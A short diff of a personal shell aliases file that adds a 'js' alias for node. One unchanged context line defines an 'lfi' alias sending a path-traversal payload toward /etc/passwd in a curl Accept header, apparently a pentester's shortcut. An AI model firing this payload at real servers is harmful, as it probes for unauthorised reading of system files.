@@ -121,6 +121,7 @@ alias up="cd .."
 alias lfi="curl -H 'Accept: ../../../../../../../../../etc/passwd{{'"
 alias ls="exa"
 alias gap="git add -p"
+alias js="node"
 
 # JAVA
 alias JAVA_HOME='/usr/libexec/java_home'
